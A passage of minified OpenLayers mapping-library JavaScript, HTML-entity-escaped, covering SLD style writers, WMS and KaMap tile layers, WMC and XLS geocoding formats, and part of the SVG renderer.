b&#125;,AnchorPoint:function(a)&#123;var b=this.createElementNSPlus("sld:AnchorPoint"),c=a.labelAnchorPointX,d=a.labelAnchorPointY;null!=c&amp;&amp;this.writeNode("AnchorPointX",c,b);null!=d&amp;&amp;this.writeNode("AnchorPointY",d,b);if(null==c&amp;&amp;null==d)&#123;var e=a.labelAlign.substr(0,1);a=a.labelAlign.substr(1,1);"l"===e?c=0:"c"===e?c=0.5:"r"===e&amp;&amp;(c=1);"b"===a?d=0:"m"===a?d=0.5:"t"===a&amp;&amp;(d=1);this.writeNode("AnchorPointX",c,b);this.writeNode("AnchorPointY",d,b)&#125;return b&#125;,AnchorPointX:function(a)&#123;return this.createElementNSPlus("sld:AnchorPointX",&#123;value:a&#125;)&#125;,AnchorPointY:function(a)&#123;return this.createElementNSPlus("sld:AnchorPointY",&#123;value:a&#125;)&#125;,Displacement:function(a)&#123;var b=this.createElementNSPlus("sld:Displacement");null!=a.labelXOffset&amp;&amp;this.writeNode("DisplacementX",a.labelXOffset,b);null!=a.labelYOffset&amp;&amp;this.writeNode("DisplacementY",a.labelYOffset,b);return b&#125;,DisplacementX:function(a)&#123;return this.createElementNSPlus("sld:DisplacementX",&#123;value:a&#125;)&#125;,DisplacementY:function(a)&#123;return this.createElementNSPlus("sld:DisplacementY",&#123;value:a&#125;)&#125;,Font:function(a)&#123;var b=this.createElementNSPlus("sld:Font");a.fontFamily&amp;&amp;this.writeNode("CssParameter",&#123;symbolizer:a,key:"fontFamily"&#125;,b);a.fontSize&amp;&amp;this.writeNode("CssParameter",&#123;symbolizer:a,key:"fontSize"&#125;,b);a.fontWeight&amp;&amp;this.writeNode("CssParameter",&#123;symbolizer:a,key:"fontWeight"&#125;,b);a.fontStyle&amp;&amp;this.writeNode("CssParameter",&#123;symbolizer:a,key:"fontStyle"&#125;,b);return b&#125;,Label:function(a)&#123;return this.writers.sld._OGCExpression.call(this,"sld:Label",a)&#125;,Halo:function(a)&#123;var b=this.createElementNSPlus("sld:Halo");a.haloRadius&amp;&amp;this.writeNode("Radius",a.haloRadius,b);(a.haloColor||a.haloOpacity)&amp;&amp;this.writeNode("Fill",&#123;fillColor:a.haloColor,fillOpacity:a.haloOpacity&#125;,b);return b&#125;,Radius:function(a)&#123;return this.createElementNSPlus("sld:Radius",&#123;value:a&#125;)&#125;,RasterSymbolizer:function(a)&#123;var b=this.createElementNSPlus("sld:RasterSymbolizer");a.geometry&amp;&amp;this.writeNode("Geometry",a.geometry,b);a.opacity&amp;&amp;this.writeNode("Opacity",a.opacity,b);a.colorMap&amp;&amp;this.writeNode("ColorMap",a.colorMap,b);return b&#125;,Geometry:function(a)&#123;var b=this.createElementNSPlus("sld:Geometry");a.property&amp;&amp;this.writeNode("ogc:PropertyName",a,b);return b&#125;,ColorMap:function(a)&#123;for(var b=this.createElementNSPlus("sld:ColorMap"),c=0,d=a.length;c&lt;d;++c)this.writeNode("ColorMapEntry",a[c],b);return b&#125;,ColorMapEntry:function(a)&#123;var b=this.createElementNSPlus("sld:ColorMapEntry");b.setAttribute("color",a.color);void 0!==a.opacity&amp;&amp;b.setAttribute("opacity",parseFloat(a.opacity));void 0!==a.quantity&amp;&amp;b.setAttribute("quantity",parseFloat(a.quantity));void 0!==a.label&amp;&amp;b.setAttribute("label",a.label);return b&#125;,PolygonSymbolizer:function(a)&#123;var b=this.createElementNSPlus("sld:PolygonSymbolizer");!1!==a.fill&amp;&amp;this.writeNode("Fill",a,b);!1!==a.stroke&amp;&amp;this.writeNode("Stroke",a,b);return b&#125;,Fill:function(a)&#123;var b=this.createElementNSPlus("sld:Fill");a.fillColor&amp;&amp;this.writeNode("CssParameter",&#123;symbolizer:a,key:"fillColor"&#125;,b);null!=a.fillOpacity&amp;&amp;this.writeNode("CssParameter",&#123;symbolizer:a,key:"fillOpacity"&#125;,b);return b&#125;,PointSymbolizer:function(a)&#123;var b=this.createElementNSPlus("sld:PointSymbolizer");this.writeNode("Graphic",a,b);return b&#125;,Graphic:function(a)&#123;var b=this.createElementNSPlus("sld:Graphic");void 0!=a.externalGraphic?this.writeNode("ExternalGraphic",a,b):this.writeNode("Mark",a,b);void 0!=a.graphicOpacity&amp;&amp;this.writeNode("Opacity",a.graphicOpacity,b);void 0!=a.pointRadius?this.writeNode("Size",2*a.pointRadius,b):void 0!=a.graphicWidth&amp;&amp;this.writeNode("Size",a.graphicWidth,b);void 0!=a.rotation&amp;&amp;this.writeNode("Rotation",a.rotation,b);return b&#125;,ExternalGraphic:function(a)&#123;var b=this.createElementNSPlus("sld:ExternalGraphic");this.writeNode("OnlineResource",a.externalGraphic,b);a=a.graphicFormat||this.getGraphicFormat(a.externalGraphic);this.writeNode("Format",a,b);return b&#125;,Mark:function(a)&#123;var b=this.createElementNSPlus("sld:Mark");a.graphicName&amp;&amp;this.writeNode("WellKnownName",a.graphicName,b);!1!==a.fill&amp;&amp;this.writeNode("Fill",a,b);!1!==a.stroke&amp;&amp;this.writeNode("Stroke",a,b);return b&#125;,WellKnownName:function(a)&#123;return this.createElementNSPlus("sld:WellKnownName",&#123;value:a&#125;)&#125;,Opacity:function(a)&#123;return this.createElementNSPlus("sld:Opacity",&#123;value:a&#125;)&#125;,Size:function(a)&#123;return this.writers.sld._OGCExpression.call(this,"sld:Size",a)&#125;,Rotation:function(a)&#123;return this.createElementNSPlus("sld:Rotation",&#123;value:a&#125;)&#125;,OnlineResource:function(a)&#123;return this.createElementNSPlus("sld:OnlineResource",&#123;attributes:&#123;"xlink:type":"simple","xlink:href":a&#125;&#125;)&#125;,Format:function(a)&#123;return this.createElementNSPlus("sld:Format",&#123;value:a&#125;)&#125;&#125;&#125;,OpenLayers.Format.Filter.v1_0_0.prototype.writers),CLASS_NAME:"OpenLayers.Format.SLD.v1"&#125;);OpenLayers.Layer.WMS=OpenLayers.Class(OpenLayers.Layer.Grid,&#123;DEFAULT_PARAMS:&#123;service:"WMS",version:"1.1.1",request:"GetMap",styles:"",format:"image/jpeg"&#125;,isBaseLayer:!0,encodeBBOX:!1,noMagic:!1,yx:&#123;&#125;,initialize:function(a,b,c,d)&#123;var e=[];c=OpenLayers.Util.upperCaseObject(c);1.3&lt;=parseFloat(c.VERSION)&amp;&amp;!c.EXCEPTIONS&amp;&amp;(c.EXCEPTIONS="INIMAGE");e.push(a,b,c,d);OpenLayers.Layer.Grid.prototype.initialize.apply(this,e);OpenLayers.Util.applyDefaults(this.params,OpenLayers.Util.upperCaseObject(this.DEFAULT_PARAMS));!this.noMagic&amp;&amp;(this.params.TRANSPARENT&amp;&amp;"true"==this.params.TRANSPARENT.toString().toLowerCase())&amp;&amp;(null!=d&amp;&amp;d.isBaseLayer||(this.isBaseLayer=!1),"image/jpeg"==this.params.FORMAT&amp;&amp;(this.params.FORMAT=OpenLayers.Util.alphaHack()?"image/gif":"image/png"))&#125;,clone:function(a)&#123;null==a&amp;&amp;(a=new OpenLayers.Layer.WMS(this.name,this.url,this.params,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])&#125;,reverseAxisOrder:function()&#123;var a=this.projection.getCode();return 1.3&lt;=parseFloat(this.params.VERSION)&amp;&amp;!!(this.yx[a]||OpenLayers.Projection.defaults[a]&amp;&amp;OpenLayers.Projection.defaults[a].yx)&#125;,getURL:function(a)&#123;a=this.adjustBounds(a);var b=this.getImageSize(),c=&#123;&#125;,d=this.reverseAxisOrder();c.BBOX=this.encodeBBOX?a.toBBOX(null,d):a.toArray(d);c.WIDTH=b.w;c.HEIGHT=b.h;return this.getFullRequestString(c)&#125;,mergeNewParams:function(a)&#123;a=[OpenLayers.Util.upperCaseObject(a)];return OpenLayers.Layer.Grid.prototype.mergeNewParams.apply(this,a)&#125;,getFullRequestString:function(a,b)&#123;var c=this.map.getProjectionObject(),c=this.projection&amp;&amp;this.projection.equals(c)?this.projection.getCode():c.getCode(),c="none"==c?null:c;1.3&lt;=parseFloat(this.params.VERSION)?this.params.CRS=c:this.params.SRS=c;"boolean"==typeof this.params.TRANSPARENT&amp;&amp;(a.TRANSPARENT=this.params.TRANSPARENT?"TRUE":"FALSE");return OpenLayers.Layer.Grid.prototype.getFullRequestString.apply(this,arguments)&#125;,CLASS_NAME:"OpenLayers.Layer.WMS"&#125;);OpenLayers.Layer.KaMap=OpenLayers.Class(OpenLayers.Layer.Grid,&#123;isBaseLayer:!0,DEFAULT_PARAMS:&#123;i:"jpeg",map:""&#125;,initialize:function(a,b,c,d)&#123;OpenLayers.Layer.Grid.prototype.initialize.apply(this,arguments);this.params=OpenLayers.Util.applyDefaults(this.params,this.DEFAULT_PARAMS)&#125;,getURL:function(a)&#123;a=this.adjustBounds(a);var b=this.map.getResolution(),c=Math.round(1E4*this.map.getScale())/1E4,d=Math.round(a.left/b);a=-Math.round(a.top/b);return this.getFullRequestString(&#123;t:a,l:d,s:c&#125;)&#125;,calculateGridLayout:function(a,b,c)&#123;b=c*this.tileSize.w;c*=this.tileSize.h;return&#123;tilelon:b,tilelat:c,startcol:Math.floor(a.left/b)-this.buffer,startrow:Math.floor(a.top/c)+this.buffer&#125;&#125;,getTileBoundsForGridIndex:function(a,b)&#123;this.getTileOrigin();var c=this.gridLayout,d=c.tilelon,e=c.tilelat,f=(c.startcol+b)*d,c=(c.startrow-a)*e;return new OpenLayers.Bounds(f,c,f+d,c+e)&#125;,clone:function(a)&#123;null==a&amp;&amp;(a=new OpenLayers.Layer.KaMap(this.name,this.url,this.params,this.getOptions()));a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a]);null!=this.tileSize&amp;&amp;(a.tileSize=this.tileSize.clone());a.grid=[];return a&#125;,getTileBounds:function(a)&#123;var b=this.getResolution(),c=b*this.tileSize.w,b=b*this.tileSize.h,d=this.getLonLatFromViewPortPx(a);a=c*Math.floor(d.lon/c);d=b*Math.floor(d.lat/b);return new OpenLayers.Bounds(a,d,a+c,d+b)&#125;,CLASS_NAME:"OpenLayers.Layer.KaMap"&#125;);OpenLayers.Format.WMC.v1_1_0=OpenLayers.Class(OpenLayers.Format.WMC.v1,&#123;VERSION:"1.1.0",schemaLocation:"http://www.opengis.net/context http://schemas.opengis.net/context/1.1.0/context.xsd",initialize:function(a)&#123;OpenLayers.Format.WMC.v1.prototype.initialize.apply(this,[a])&#125;,read_sld_MinScaleDenominator:function(a,b)&#123;var c=parseFloat(this.getChildValue(b));0&lt;c&amp;&amp;(a.maxScale=c)&#125;,read_sld_MaxScaleDenominator:function(a,b)&#123;a.minScale=parseFloat(this.getChildValue(b))&#125;,read_wmc_SRS:function(a,b)&#123;"srs"ina||(a.srs=&#123;&#125;);a.srs[this.getChildValue(b)]=!0&#125;,write_wmc_Layer:function(a)&#123;var b=OpenLayers.Format.WMC.v1.prototype.write_wmc_Layer.apply(this,[a]);if(a.maxScale)&#123;var c=this.createElementNS(this.namespaces.sld,"sld:MinScaleDenominator");c.appendChild(this.createTextNode(a.maxScale.toPrecision(16)));b.appendChild(c)&#125;a.minScale&amp;&amp;(c=this.createElementNS(this.namespaces.sld,"sld:MaxScaleDenominator"),c.appendChild(this.createTextNode(a.minScale.toPrecision(16))),b.appendChild(c));if(a.srs)for(var d in a.srs)b.appendChild(this.createElementDefaultNS("SRS",d));b.appendChild(this.write_wmc_FormatList(a));b.appendChild(this.write_wmc_StyleList(a));a.dimensions&amp;&amp;b.appendChild(this.write_wmc_DimensionList(a));b.appendChild(this.write_wmc_LayerExtension(a));return b&#125;,CLASS_NAME:"OpenLayers.Format.WMC.v1_1_0"&#125;);OpenLayers.Format.XLS=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,&#123;defaultVersion:"1.1.0",stringifyOutput:!0,CLASS_NAME:"OpenLayers.Format.XLS"&#125;);OpenLayers.Format.XLS.v1=OpenLayers.Class(OpenLayers.Format.XML,&#123;namespaces:&#123;xls:"http://www.opengis.net/xls",gml:"http://www.opengis.net/gml",xsi:"http://www.w3.org/2001/XMLSchema-instance"&#125;,regExes:&#123;trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g&#125;,xy:!0,defaultPrefix:"xls",schemaLocation:null,read:function(a,b)&#123;OpenLayers.Util.applyDefaults(b,this.options);var c=&#123;&#125;;this.readChildNodes(a,c);return c&#125;,readers:&#123;xls:&#123;XLS:function(a,b)&#123;b.version=a.getAttribute("version");this.readChildNodes(a,b)&#125;,Response:function(a,b)&#123;this.readChildNodes(a,b)&#125;,GeocodeResponse:function(a,b)&#123;b.responseLists=[];this.readChildNodes(a,b)&#125;,GeocodeResponseList:function(a,b)&#123;var c=&#123;features:[],numberOfGeocodedAddresses:parseInt(a.getAttribute("numberOfGeocodedAddresses"))&#125;;b.responseLists.push(c);this.readChildNodes(a,c)&#125;,GeocodedAddress:function(a,b)&#123;var c=new OpenLayers.Feature.Vector;b.features.push(c);this.readChildNodes(a,c);c.geometry=c.components[0]&#125;,GeocodeMatchCode:function(a,b)&#123;b.attributes.matchCode=&#123;accuracy:parseFloat(a.getAttribute("accuracy")),matchType:a.getAttribute("matchType")&#125;&#125;,Address:function(a,b)&#123;var c=&#123;countryCode:a.getAttribute("countryCode"),addressee:a.getAttribute("addressee"),street:[],place:[]&#125;;b.attributes.address=c;this.readChildNodes(a,c)&#125;,freeFormAddress:function(a,b)&#123;b.freeFormAddress=this.getChildValue(a)&#125;,StreetAddress:function(a,b)&#123;this.readChildNodes(a,b)&#125;,Building:function(a,b)&#123;b.building=&#123;number:a.getAttribute("number"),subdivision:a.getAttribute("subdivision"),buildingName:a.getAttribute("buildingName")&#125;&#125;,Street:function(a,b)&#123;b.street.push(this.getChildValue(a))&#125;,Place:function(a,b)&#123;b.place[a.getAttribute("type")]=this.getChildValue(a)&#125;,PostalCode:function(a,b)&#123;b.postalCode=this.getChildValue(a)&#125;&#125;,gml:OpenLayers.Format.GML.v3.prototype.readers.gml&#125;,write:function(a)&#123;return this.writers.xls.XLS.apply(this,[a])&#125;,writers:&#123;xls:&#123;XLS:function(a)&#123;var b=this.createElementNSPlus("xls:XLS",&#123;attributes:&#123;version:this.VERSION,"xsi:schemaLocation":this.schemaLocation&#125;&#125;);this.writeNode("RequestHeader",a.header,b);this.writeNode("Request",a,b);return b&#125;,RequestHeader:function(a)&#123;return this.createElementNSPlus("xls:RequestHeader")&#125;,Request:function(a)&#123;var b=this.createElementNSPlus("xls:Request",&#123;attributes:&#123;methodName:"GeocodeRequest",requestID:a.requestID||"",version:this.VERSION&#125;&#125;);this.writeNode("GeocodeRequest",a.addresses,b);return b&#125;,GeocodeRequest:function(a)&#123;for(var b=this.createElementNSPlus("xls:GeocodeRequest"),c=0,d=a.length;c&lt;d;c++)this.writeNode("Address",a[c],b);return b&#125;,Address:function(a)&#123;var b=this.createElementNSPlus("xls:Address",&#123;attributes:&#123;countryCode:a.countryCode&#125;&#125;);a.freeFormAddress?this.writeNode("freeFormAddress",a.freeFormAddress,b):(a.street&amp;&amp;this.writeNode("StreetAddress",a,b),a.municipality&amp;&amp;this.writeNode("Municipality",a.municipality,b),a.countrySubdivision&amp;&amp;this.writeNode("CountrySubdivision",a.countrySubdivision,b),a.postalCode&amp;&amp;this.writeNode("PostalCode",a.postalCode,b));return b&#125;,freeFormAddress:function(a)&#123;return this.createElementNSPlus("freeFormAddress",&#123;value:a&#125;)&#125;,StreetAddress:function(a)&#123;var b=this.createElementNSPlus("xls:StreetAddress");a.building&amp;&amp;this.writeNode(b,"Building",a.building);a=a.street;OpenLayers.Util.isArray(a)||(a=[a]);for(var c=0,d=a.length;c&lt;d;c++)this.writeNode("Street",a[c],b);return b&#125;,Building:function(a)&#123;return this.createElementNSPlus("xls:Building",&#123;attributes:&#123;number:a.number,subdivision:a.subdivision,buildingName:a.buildingName&#125;&#125;)&#125;,Street:function(a)&#123;return this.createElementNSPlus("xls:Street",&#123;value:a&#125;)&#125;,Municipality:function(a)&#123;return this.createElementNSPlus("xls:Place",&#123;attributes:&#123;type:"Municipality"&#125;,value:a&#125;)&#125;,CountrySubdivision:function(a)&#123;return this.createElementNSPlus("xls:Place",&#123;attributes:&#123;type:"CountrySubdivision"&#125;,value:a&#125;)&#125;,PostalCode:function(a)&#123;return this.createElementNSPlus("xls:PostalCode",&#123;value:a&#125;)&#125;&#125;&#125;,CLASS_NAME:"OpenLayers.Format.XLS.v1"&#125;);OpenLayers.Format.XLS.v1_1_0=OpenLayers.Class(OpenLayers.Format.XLS.v1,&#123;VERSION:"1.1",schemaLocation:"http://www.opengis.net/xls http://schemas.opengis.net/ols/1.1.0/LocationUtilityService.xsd",CLASS_NAME:"OpenLayers.Format.XLS.v1_1_0"&#125;);OpenLayers.Format.XLS.v1_1=OpenLayers.Format.XLS.v1_1_0;OpenLayers.Renderer.SVG=OpenLayers.Class(OpenLayers.Renderer.Elements,&#123;xmlns:"http://www.w3.org/2000/svg",xlinkns:"http://www.w3.org/1999/xlink",MAX_PIXEL:15E3,translationParameters:null,symbolMetrics:null,initialize:function(a)&#123;this.supported()&amp;&amp;(OpenLayers.Renderer.Elements.prototype.initialize.apply(this,arguments),this.translationParameters=&#123;x:0,y:0&#125;,this.symbolMetrics=&#123;&#125;)&#125;,supported:function()&#123;return document.implementation&amp;&amp;(document.implementation.hasFeature("org.w3c.svg","1.0")||document.implementation.hasFeature("http://www.w3.org/TR/SVG11/feature#SVG","1.1")||document.implementation.hasFeature("http://www.w3.org/TR/SVG11/feature#BasicStructure","1.1"))&#125;,inValidRange:function(a,b,c)&#123;a+=c?0:this.translationParameters.x;b+=c?0:this.translationParameters.y;return a&gt;=-this.MAX_PIXEL&amp;&amp;a&lt;=this.MAX_PIXEL&amp;&amp;b&gt;=-this.MAX_PIXEL&amp;&amp;b&lt;=this.MAX_PIXEL&#125;,setExtent:function(a,b)&#123;var c=OpenLayers.Renderer.Elements.prototype.setExtent.apply(this,arguments),d=this.getResolution(),e=-a.left/d,d=a.top/d;if(b)return this.left=e,this.top=d,this.rendererRoot.setAttributeNS(null,"viewBox","0 0 "+this.size.w+" "+this.size.h),this.translate(this.xOffset,0),!0;(e=this.translate(e-this.left+this.xOffset,d-this.top))||this.setExtent(a,!0);return c&amp;&amp;e&#125;,translate:function(a,b)&#123;if(this.inValidRange(a,b,!0))&#123;var c="";if(a||b)c="translate("+a+","+b+")";this.root.setAttributeNS(null,"transform",c);this.translationParameters=&#123;x:a,y:b&#125;;return!0&#125;return!1&#125;,setSize:function(a)&#123;OpenLayers.Renderer.prototype.setSize.apply(this,arguments);this.rendererRoot.setAttributeNS(null,"width",this.size.w);this.rendererRoot.setAttributeNS(null,"height",this.size.h)&#125;,getNodeType:function(a,b)&#123;var c=null;switch(a.CLASS_NAME)&#123;case "OpenLayers.Geometry.Point":c=b.externalGraphic?"image":this.isComplexSymbol(b.graphicName)?"svg":"circle";break;case "OpenLayers.Geometry.Rectangle":c="rect";break;case "OpenLayers.Geometry.LineString":c="polyline";break;case "OpenLayers.Geometry.LinearRing":c="polygon";break;case "OpenLayers.Geometry.Polygon":case "OpenLayers.Geometry.Curve":c="path"&#125;return c&#125;,setStyle:function(a,b,c)&#123;b=b||a._style;c=c||a._options;var d=b.title||b.graphicTitle;if(d)&#123;a.setAttributeNS(null,"title",d);var e=a.getElementsByTagName("title");0&lt;e.length?e[0].firstChild.textContent=d:(e=this.nodeFactory(null,"title"),e.textContent=d,a.appendChild(e))&#125;var e=parseFloat(a.getAttributeNS(null,"r")),d=1,f;if("OpenLayers.Geometry.Point"==a._geometryClass&amp;&amp;e)&#123;a.style.visibility="";if(!1===b.graphic)a.style.visibility="hidden";else if(b.externalGraphic)&#123;f=this.getPosition(a);b.graphicWidth&amp;&amp;b.graphicHeight&amp;&amp;a.setAttributeNS(null,"preserveAspectRatio","none");var e=b.graphicWidth||b.graphicHeight,g=b.graphicHeight||b.graphicWidth,e=e?e:2*b.pointRadius,g=g?g:2*b.pointRadius,h=void 0!=b.graphicYOffset?b.graphicYOffset:-(0.5*g),k=b.graphicOpacity||b.fillOpacity;a.setAttributeNS(null,"x",(f.x+(void 0!=b.graphicXOffset?b.graphicXOffset:-(0.5*e))).toFixed());a.setAttributeNS(null,"y",(f.y+h).toFixed());a.setAttributeNS(null,"width",e);a.setAttributeNS(null,"height",g);a.setAttributeNS(this.xlinkns,"xlink:href",b.externalGraphic);a.setAttributeNS(null,"style","opacity: "+k);a.onclick=OpenLayers.Event.preventDefault&#125;else if(this.isComplexSymbol(b.graphicName))&#123;var e=3*b.pointRadius,g=2*e,l=this.importSymbol(b.graphicName);f=this.getPosition(a);d=3*this.symbolMetrics[l.id][0]/g;h=a.parentNode;k=a.nextSibling;h&amp;&amp;h.removeChild(a);a.firstChild&amp;&amp;a.removeChild(a.firstChild);a.appendChild(l.firstChild.cloneNode(!0));a.setAttributeNS(null,"viewBox",l.getAttributeNS(null,"viewBox"));a.setAttributeNS(null,"width",g);a.setAttributeNS(null,"height",g);a.setAttributeNS(null,"x",f.x-e);a.setAttributeNS(null,"y",f.y-e);k?h.insertBefore(a,k):h&amp;&amp;h.appendChild(a)&#125;else a.setAttributeNS(null,"r",b.pointRadius);e=b.rotation;void 0===e&amp;&amp;void 0===a._rotation||!f||(a._rotation=e,e|=0,"svg"!==a.nodeName?a.setAttributeNS(null,"transform","rotate("+e+" "+f.x+" "+f.y+")"):(f=this.symbolMetrics[l.id],a.firstChild.setAttributeNS(null,"transform","rotate("+e+" "+f[1]+" "+f[2]+")")))&#125;c.isFilled?(a.setAttributeNS(null,"fill",b.fillColor),a.setAttributeNS(null,"fill-opacity",b.fillOpacity)):a.setAttributeNS(null,"fill","none");c.isStroked?(a.setAttributeNS(null,"stroke",b.strokeColor),a.setAttributeNS(null,"stroke-opacity",b.strokeOpacity),a.setAttributeNS(null,"stroke-width",b.strokeWidth*d),a.setAttributeNS(null,"stroke-linecap",b.strokeLinecap||"round"),a.setAttributeNS(null,"stroke-linejoin","round"),b.strokeDashstyle&amp;&amp;a.setAttributeNS(null,"stroke-dasharray",this.dashStyle(b,d))):a.setAttributeNS(null,"stroke","none");b.pointerEvents&amp;&amp;a.setAttributeNS(null,"pointer-events",b.pointerEvents);null!=b.cursor&amp;&amp;a.setAttributeNS(null,"cursor",b.cursor);return a&#125;,dashStyle:function(a,b)&#123;var c=a.strokeWidth*b,d=a.strokeDashstyle;switch(d)&#123;case "solid":return"none";case "dot":return[1,4*c].join();case "dash":return[4*c,4*c].join();case "dashdot":return[4*c,4*c,1,4*c].join();case "longdash":return[8*c,4*c].join();case "longdashdot":return[8*c,4*c,1,4*c].join();default:return OpenLayers.String.trim(d).replace(/\s+/g,",")&#125;&#125;,createNode:function(a,b)&#123;var c=document.createElementNS(this.xmlns,a);b&amp;&amp;c.setAttributeNS(null,"id",b);return c&#125;,nodeTypeCompare:function(a,b)&#123;return b==a.nodeName&#125;,createRenderRoot:function()&#123;var a=this.nodeFactory(this.container.id+"_svgRoot","svg");a.style.display="block";return a&#125;,createRoot:function(a)&#123;return this.nodeFactory(this.container.id+a,"g")&#125;,createDefs:function()&#123;var a=this.nodeFactory(this.container.id+"_defs","defs");this.rendererRoot.appendChild(a);return a&#125;,drawPoint:function(a,b)&#123;return this.drawCircle(a,b,1)&#125;,drawCircle:function(a,b,c)&#123;var d=this.getResolution(),e=(b.x-this.featureDx)/d+this.left;b=this.top-b.y/d;return this.inValidRange(e,b)?(a.setAttributeNS(null,"cx",e),a.setAttributeNS(null,"cy",b),a.setAttributeNS(null,"r",c),a):!1&#125;,drawLineString:function(a,b)&#123;var c=this.getComponentsString(b.components);return c.path?(a.setAttributeNS(null,"points",c.path),c.complete?a:null):!1&#125;,drawLinearRing:function(a,b)&#123;var c=this.getComponentsString(b.components);return c.path?(a.setAttributeNS(null,"points",c.path),c.complete?a:null):!1&#125;,drawPolygon:function(a,b)&#123;for(var c="",d=!0,e=!0,f,g,h=0,k=b.components.length;h&lt;k;h++)c+=" M",f=this.getComponentsString(b.components[h].components," "),(g=f.path)?(c+=" "+g,e=f.complete&amp;&amp;e):d=!1;return d?(a.setAttributeNS(null,"d",c+" z"),a.setAttributeNS(null,"fill-rule","evenodd"),e?a:null):!1&#125;,drawRectangle:function(a,b)&#123;var c=this.getResolution(),d=(b.x-this.featureDx)/c+this.left,e=this.top-b.y/c;return this.inValidRange(d,e)?(a.setAttributeNS(null,"x",d),a.setAttributeNS(null,"y",e),a.setAttributeNS(null,"width",b.width/c),a.setAttributeNS(null,"height",b.height/c),a):!1&#125;,drawText:function(a,b,c)&#123;var d=!!b.labelOutlineWidth;if(d)&#123;var e=OpenLayers.Util.extend(&#123;&#125;,b);e.fontColor=e.labelOutlineColor;e.fontStrokeColor=e.labelOutlineColor;e.fontStrokeWidth=b.labelOutlineWidth;b.labelOutlineOpacity&amp;&amp;(e.fontOpacity=b.labelOutlineOpacity);delete e.labelOutlineWidth;this.drawText(a,e,c)&#125;var f=this.getResolution(),e=(c.x-this.featureDx)/f+this.left,g=c.y/f-this.top,d=d?this.LABEL_OUTLINE_SUFFIX:this.LABEL_ID_SUFFIX,f=this.nodeFactory(a+d,"text");f.setAttributeNS(null,"x",e);f.setAttributeNS(null,"y",-g);b.fontColor&amp;&amp;f.setAttributeNS(null,"fill",b.fontColor);b.fontStrokeColor&amp;&amp;f.setAttributeNS(null,"stroke",b.fontStrokeColor);b.fontStrokeWidth&amp;&amp;f.setAttributeNS(null,"stroke-width",b.fontStrokeWidth);b.fontOpacity&amp;&amp;f.setAttributeNS(null,"opacity",b.fontOpacity);b.fontFamily&amp;&amp;f.setAttributeNS(null,"font-family",b.fontFamily);b.fontSize&amp;&amp;f.setAttributeNS(null,"font-size",b.fontSize);b.fontWeight&amp;&amp;f.setAttributeNS(null,"font-weight",b.fontWeight);b.fontStyle&amp;&amp;f.setAttributeNS(null,"font-style",b.fontStyle);!0===b.labelSelect?(f.setAttributeNS(null,"pointer-events","visible"),f._featureId=a):f.setAttributeNS(null,"pointer-events","none");g=b.labelAlign||OpenLayers.Renderer.defaultSymbolizer.labelAlign;f.setAttributeNS(null,"text-anchor",OpenLayers.Renderer.SVG.LABEL_ALIGN[g[0]]||"middle");!0===OpenLayers.IS_GECKO&amp;&amp;f.setAttributeNS(null,"dominant-baseline",OpenLayers.Renderer.SVG.LABEL_ALIGN[g[1]]||"central");for(var h=b.label.split("\n"),k=h.length;f.childNodes.length&gt;k;)f.removeChild(f.lastChild);for(var l=0;l&lt;k;l++)&#123;var m=this.nodeFactory(a+d+"_tspan_"+l,"tspan");!0===b.labelSelect&amp;&amp;(m._featureId=a,m._geometry=c,m._geometryClass=c.CLASS_NAME);!1===OpenLayers.IS_GECKO&amp;&amp;m.setAttributeNS(null,"baseline-shift",OpenLayers.Renderer.SVG.LABEL_VSHIFT[g[1]]||"-35%");m.setAttribute("x",e);if(0==l)&#123;var n=OpenLayers.Renderer.SVG.LABEL_VFACTOR[g[1]];null==n&amp;&amp;(n=-0.5);m.setAttribute("dy",n*(k-1)+"em")&#125;else m.setAttribute("dy","1em");m.textContent=""===h[l]?" ":h[l];m.parentNode||f.appendChild(m)&#125;f.parentNode||this.textRoot.appendChild(f)&#125;,getComponentsString:function(a,b)&#123;for(var c=[],d=!0,e=a.length,f=[],g,h=0;h&lt;e;h++)g=a[h],c.push(g),(g=this.getShortString(g))?f.push(g):(0&lt;h&amp;&amp;this.getShortString(a[h-1])&amp;&amp;f.push(this.clipLine(a[h],a[h-1])),h&lt;e-1&amp;&amp;this.getShortString(a[h+1])&amp;&amp;f.push(this.clipLine(a[h],a[h+1])),d=!1);return&#123;path:f.join(b||","),complete:d&#125;&#125;,clipLine:function(a,b)&#123;if(b.equals(a))return"";var c=this.getResolution(),d=this.MAX_PIXEL-this.translationParameters.x,e=this.MAX_PIXEL-this.translationParameters.y,f=(b.x-this.featureDx)/c+this.left,g=this.top-b.y/c,h=(a.x-this.featureDx)/c+this.left,c=this.top-a.y/c,k;if(h&lt;-d||h&gt;d)k=(c-g)/(h-f),h=0&gt;h?-d:d,c=g+(h-f)*k;if(c&lt;-e||c&gt;e)k=(h-f)/(c-g),c=0&gt;c?-e:e,h=f+(c-g)*k;return h+","+c&#125;,getShortString:function(a)&#123;var b=this.getResolution(),c=(a.x-this.featureDx)/b+this.left;a=this.top-a.y/b;return this.inValidRange(c,a)?c+","+a:!1&#125;,getPosition:function(a)&#123;return&#123;x:parseFloat(a.getAttributeNS(null,"cx")),y:parseFloat(a.getAttributeNS(null,"cy"))&#125;&#125;,importSymbol:function(a)&#123;this.defs||(this.defs=this.createDefs());var b=this.container.id+"-"+a,c=document.getElementById(b);if(null!=c)return c;var d=OpenLayers.Renderer.symbol[a];if(!d)throw Error(a+" is not a valid symbol name");a=this.nodeFactory(b,"symbol");var e=this.nodeFactory(null,"polygon");a.appendChild(e);for(var c=new OpenLayers.Bounds(Number.MAX_VALUE,Number.MAX_VALUE,0,0),f=[],g,h,k=0;k&lt;d.length;k+=2)g=d[k],h=d[k+1],c.left=Math.min(c.left,g),c.bottom=Math.min(c.bottom,h),c.right=Math.max(c.right,g),c.top=Math.max(c.top,h),f.push(g,",",h);e.setAttributeNS(null,"points",f.join(" "));d=c.getWidth();e=c.getHeight();a.setAttributeNS(null,"viewBox",[c.left-d,c.bottom-e,3*d,3*e].join(" "));this.symbolMetrics[b]=[Math.max(d,e),c.getCenterLonLat().lon,c.getCenterLonLat().lat];this.defs.appendChild(a);return a&#125;,getFeatureIdFromEvent:function(a)&#123;var b=OpenLayers.Renderer.Elements.prototype.getFeatureIdFromEvent.apply(this,arguments);b||(b=a.target,b=b.parentNode&amp;&amp;b!=this.rendererRoot?b.parentNode._featureId:void 0);return 